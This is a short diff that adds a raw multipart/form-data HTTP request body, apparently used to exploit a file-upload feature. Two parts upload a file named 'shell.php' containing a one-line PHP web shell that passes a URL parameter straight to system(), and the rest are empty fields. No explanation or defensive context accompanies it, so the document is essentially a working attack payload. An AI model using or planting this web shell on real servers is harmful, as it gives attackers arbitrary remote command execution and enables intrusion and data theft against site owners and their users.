@@ -1,0 +1,21 @@
+Content-Disposition: form-data; name="myfile"; filename="shell.php"
+Content-Type: application/x-httpd-php
+
+<?php $cmd=$_GET['cmd']; system($cmd);?>
+
+
+-----------------------------205946976257369239535727507
+Content-Disposition: form-data; name="myfile"; filename="shell.php"
+Content-Type: application/x-httpd-php
+
+<?php $cmd=$_GET['cmd']; system($cmd);?>
+
+-----------------------------205946976257369239535727507
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------205946976257369239535727507
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------205946976257369239535727507--
